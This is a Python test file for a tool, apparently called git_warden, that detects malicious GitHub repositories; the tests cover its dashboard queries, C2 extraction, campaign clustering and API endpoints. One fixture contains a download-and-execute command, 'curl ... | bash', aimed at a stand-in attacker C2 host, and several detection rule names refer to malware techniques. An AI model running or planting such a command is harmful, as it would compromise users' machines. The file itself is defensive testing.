"""Tests for the telemetry dashboard: pure queries + a FastAPI smoke test."""

from __future__ import annotations

from conftest import utcnow

from git_warden.dashboard import queries
from git_warden.db import Database
from git_warden.enums import ArtifactType, DetectionMethod, FeedSource, RepoFindingStatus
from git_warden.models import MaliciousArtifact, RepoFinding


def _seed(tmp_path):
    db = Database.open(tmp_path / "d.sqlite")
    db.start_run("r1", utcnow())
    # OSM knows this one -> validation, not novel
    db.upsert_artifact(MaliciousArtifact(
        artifact_type=ArtifactType.REPO, name="known/lure", ecosystem="github",
        source=FeedSource.OPEN_SOURCE_MALWARE,
        raw_payload={"resource_identifier": "https://github.com/known/lure",
                     "severity_level": "high", "tags": ["dprk"]}), "r1")
    db.upsert_finding(RepoFinding(
        full_name="known/lure", detection_method=DetectionMethod.OSM_REPOSITORY,
        status=RepoFindingStatus.CONFIRMED, score=8,
        raw_payload={"bash_findings": [
            {"file": "postcss.config.js", "line": 1, "category": "obfuscation",
             "rule": "eval-decoded"}], "osm": {"severity": "high", "tags": ["dprk"]}}), "r1")
    # novel campaign siblings via signature_match, sharing a signature
    for nm in ("evil/a", "evil/b"):
        db.upsert_finding(RepoFinding(
            full_name=nm, detection_method=DetectionMethod.SIGNATURE_MATCH,
            status=RepoFindingStatus.CONFIRMED, score=4, matched_iocs=["STUBSIG"],
            raw_payload={"bash_findings": [
                {"file": "postcss.config.mjs", "line": 1, "category": "obfuscation",
                 "rule": "eval-decoded"}]}), "r1")
    db.upsert_finding(RepoFinding(
        full_name="legit/app", detection_method=DetectionMethod.IOC_SEARCH,
        status=RepoFindingStatus.REJECTED, score=2), "r1")
    return db


def test_summary_counts_novel_vs_osm_known(tmp_path):
    db = _seed(tmp_path)
    s = queries.summary(db)
    assert s["confirmed"] == 3
    assert s["novel"] == 2            # evil/a, evil/b (known/lure is OSM-known)
    assert s["osm_known_confirmed"] == 1
    assert s["rejected"] == 1
    assert s["by_method"]["signature_match"] == 2
    db.close()


def test_attack_vector_and_c2_presentation(tmp_path):
    # The dashboard must explain a finding, not dump blobs: name the attack
    # vector, extract the attacker C2, and filter reputable installer hosts.
    db = Database.open(tmp_path / "v.sqlite")
    db.start_run("r1", utcnow())
    db.upsert_finding(RepoFinding(
        full_name="evil/lure", detection_method=DetectionMethod.MALICIOUS_OWNER,
        status=RepoFindingStatus.CONFIRMED, score=9,
        raw_payload={"bash_findings": [
            # confirming rule + attacker C2, plus a LEGIT nodesource install line
            {"file": ".vscode/tasks.json", "line": 0, "category": "install_hook",
             "rule": "vscode-autorun",
             "snippet": "curl https://evil-c2.vercel.app/x | bash"},
            {"file": "Dockerfile", "line": 3, "category": "download_exec",
             "rule": "curl-pipe-shell",
             "snippet": "curl -fsSL https://deb.nodesource.com/setup_22.x | bash"}]}), "r1")
    db.close()

    db = Database.open(tmp_path / "v.sqlite")
    d = queries.finding_detail(db, "evil/lure")
    assert d["vector"] == "VS Code folder-open auto-run"
    assert d["confirm_rule"] == "install_hook/vscode-autorun"
    assert d["c2_hosts"] == ["evil-c2.vercel.app"]          # nodesource filtered out
    vecs = {v["vector"]: v for v in queries.attack_vectors(db)}
    assert vecs["VS Code folder-open auto-run"]["count"] == 1
    c2 = queries.c2_infrastructure(db)
    assert c2 and c2[0]["host"] == "evil-c2.vercel.app" and c2[0]["repo_count"] == 1
    assert not any(x["host"] == "deb.nodesource.com" for x in c2)
    db.close()


def test_source_yield_precision_and_rejected(tmp_path):
    db = _seed(tmp_path)
    sy = {r["method"]: r for r in queries.source_yield(db)}
    # signature_match: 2 confirmed, 0 rejected -> 100% precision
    assert sy["signature_match"]["confirmed"] == 2
    assert sy["signature_match"]["precision"] == 1.0
    # ioc_search: 0 confirmed, 1 rejected -> 0% precision (the noisy-source signal)
    assert sy["ioc_search"]["rejected"] == 1
    assert sy["ioc_search"]["precision"] == 0.0
    # worst precision sorts first
    assert queries.source_yield(db)[0]["method"] == "ioc_search"
    rej = queries.rejected_findings(db)
    assert [r["full_name"] for r in rej] == ["legit/app"]
    assert rej[0]["method"] == "ioc_search"
    db.close()


def test_campaign_clusters_group_by_signature_and_owner(tmp_path):
    db = _seed(tmp_path)
    c = queries.campaign_clusters(db)
    assert set(c["by_signature"]["STUBSIG"]) == {"evil/a", "evil/b"}
    assert set(c["by_owner"]["evil"]) == {"evil/a", "evil/b"}  # repeat owner
    db.close()


def test_finding_detail_and_telemetry(tmp_path):
    db = _seed(tmp_path)
    d = queries.finding_detail(db, "evil/a")
    assert d["novel"] is True
    assert d["flags"][0]["rule"] == "eval-decoded"
    assert queries.finding_detail(db, "nope/nope") is None
    flags = queries.flag_telemetry(db)
    assert any(f["flag"] == "obfuscation/eval-decoded" for f in flags)
    sy = queries.signature_yield(db)
    assert sy and sy[0]["repos"] == 2
    db.close()


def test_graph_nodes_and_edges(tmp_path):
    db = _seed(tmp_path)
    g = queries.graph(db)
    ids = {n["id"] for n in g["nodes"]}
    assert {"repo:evil/a", "owner:evil", "sig:STUBSIG"} <= ids
    repo = next(n for n in g["nodes"] if n["id"] == "repo:evil/a")
    assert repo["novel"] is True and repo["type"] == "repo"
    kinds = {(e["s"], e["t"], e["kind"]) for e in g["edges"]}
    assert ("owner:evil", "repo:evil/a", "owns") in kinds
    assert ("sig:STUBSIG", "repo:evil/a", "signature") in kinds
    db.close()


def test_bad_owners_query_endpoint_and_summary_split(tmp_path):
    db = Database.open(tmp_path / "bo.sqlite")
    db.start_run("r1", utcnow())
    # evidence-confirmed repo -> brands its owner "bad"
    db.upsert_finding(RepoFinding(
        full_name="badguy/proven", detection_method=DetectionMethod.SIGNATURE_MATCH,
        status=RepoFindingStatus.CONFIRMED, score=8,
        raw_payload={"bash_findings": [
            {"file": "x.js", "line": 1, "category": "obfuscation", "rule": "eval-decoded"}]}), "r1")
    # owner-association repo, no evidence of its own -> Bad Owners, never the wall
    db.upsert_finding(RepoFinding(
        full_name="badguy/just-owned", detection_method=DetectionMethod.MALICIOUS_OWNER,
        status=RepoFindingStatus.CONFIRMED, score=6), "r1")

    bo = queries.bad_owners(db)
    assert [b["full_name"] for b in bo] == ["badguy/just-owned"]
    assert bo[0]["provenance"] == ["badguy/proven"]
    s = queries.summary(db)
    assert s["published"] == 1 and s["bad_owners"] == 1     # evidence-only vs association
    db.close()

    from fastapi.testclient import TestClient

    from git_warden.dashboard.app import create_app
    client = TestClient(create_app(tmp_path / "bo.sqlite"))
    assert client.get("/api/bad-owners").json()[0]["full_name"] == "badguy/just-owned"


def test_graph_scope_and_funnel(tmp_path):
    db = _seed(tmp_path)
    g = queries.graph(db, "confirmed")
    assert g["scope"] == "confirmed" and g["repos"] == 3       # 3 confirmed repos
    assert queries.graph(db, "all")["repos"] == 3              # no candidate/screened in seed
    f = queries.funnel(db)
    assert f["confirmed"] == 3 and f["rejected"] == 1 and f["candidate"] == 0
    db.close()


def test_recent_runs_marks_unfinished_as_live(tmp_path):
    db = _seed(tmp_path)                      # _seed starts "r1" and never finishes it
    rr = queries.recent_runs(db)
    assert rr["runs"][0]["run_id"] == "r1"
    assert rr["runs"][0]["live"] is True and rr["live"] is True
    db.close()


def test_actor_contributions_groups_by_attributed_actor(tmp_path):
    db = Database.open(tmp_path / "act.sqlite")
    db.start_run("r1", utcnow())
    # A registered, corroborated actor (mirrors seed_actors.json + ingest promotion).
    db.ensure_actor("lazarus group", "Lazarus Group", "nation_state", "r1")
    db.upsert_finding(RepoFinding(
        full_name="evilcorp/dropper-one", detection_method=DetectionMethod.OSM_REPOSITORY,
        status=RepoFindingStatus.CONFIRMED, score=10, actor_key="lazarus group"), "r1")
    db.upsert_finding(RepoFinding(
        full_name="evilcorp/dropper-two", detection_method=DetectionMethod.NEWS_MENTION,
        status=RepoFindingStatus.CONFIRMED, score=6, actor_key="lazarus group"), "r1")
    # A free-text nation-level attribution with no seed_actors.json entry: the
    # finder (_finding_from_osm_repo/_finding_from_news) must ensure_actor it
    # FIRST, same as here, or the FK check nulls it silently on upsert.
    db.ensure_actor("dprk (north korea)", "DPRK (North Korea)", "osm-attribution", "r1")
    db.upsert_finding(RepoFinding(
        full_name="other/repo", detection_method=DetectionMethod.OSM_REPOSITORY,
        status=RepoFindingStatus.CONFIRMED, score=5, actor_key="dprk (north korea)"), "r1")
    # A truly UNREGISTERED key (nothing called ensure_actor) must null out --
    # the FK safety net still holds for a genuinely bad value.
    db.upsert_finding(RepoFinding(
        full_name="never/registered", detection_method=DetectionMethod.OSM_REPOSITORY,
        status=RepoFindingStatus.CONFIRMED, score=3, actor_key="nonexistent-actor"), "r1")
    # Unattributed confirmed finding must not appear at all.
    db.upsert_finding(RepoFinding(
        full_name="plain/finding", detection_method=DetectionMethod.SIGNATURE_MATCH,
        status=RepoFindingStatus.CONFIRMED, score=4), "r1")
    db.close()

    db = Database.open(tmp_path / "act.sqlite")
    actors = queries.actor_contributions(db)
    by_key = {a["actor_key"]: a for a in actors}
    assert by_key["lazarus group"]["label"] == "Lazarus Group"
    assert by_key["lazarus group"]["actor_status"] == "candidate"
    assert by_key["lazarus group"]["repo_count"] == 2
    assert set(by_key["lazarus group"]["repos"]) == {"evilcorp/dropper-one", "evilcorp/dropper-two"}
    assert by_key["lazarus group"]["methods"] == {"osm_repository": 1, "news_mention": 1}
    # Pre-registered nation-level attribution survives and surfaces correctly.
    assert by_key["dprk (north korea)"]["label"] == "DPRK (North Korea)"
    assert by_key["dprk (north korea)"]["repo_count"] == 1
    all_repos = {r for a in actors for r in a["repos"]}
    assert "plain/finding" not in all_repos
    assert "never/registered" not in all_repos   # nulled by the FK safety net
    db.close()


def test_fastapi_endpoints_smoke(tmp_path):
    _seed(tmp_path).close()
    from fastapi.testclient import TestClient

    from git_warden.dashboard.app import create_app
    client = TestClient(create_app(tmp_path / "d.sqlite"))
    assert client.get("/api/summary").json()["confirmed"] == 3
    assert client.get("/api/campaigns").json()["by_signature"]["STUBSIG"]
    assert client.get("/api/graph").json()["nodes"]
    assert client.get("/api/graph?scope=all").json()["scope"] == "all"
    assert client.get("/api/funnel").json()["confirmed"] == 3
    assert client.get("/api/runs").json()["runs"][0]["run_id"] == "r1"
    assert client.get("/api/actors").status_code == 200
    tele = client.get("/api/telemetry").json()
    assert any(r["method"] == "signature_match" for r in tele["source_yield"])
    assert client.get("/api/rejected").json()[0]["full_name"] == "legit/app"
    assert client.get("/api/finding/evil/a").json()["novel"] is True
    assert client.get("/api/finding/nope/nope").status_code == 404
    assert client.get("/").status_code == 200  # serves the dashboard HTML
    assert client.get("/static/hero.png").status_code == 200  # watermark asset
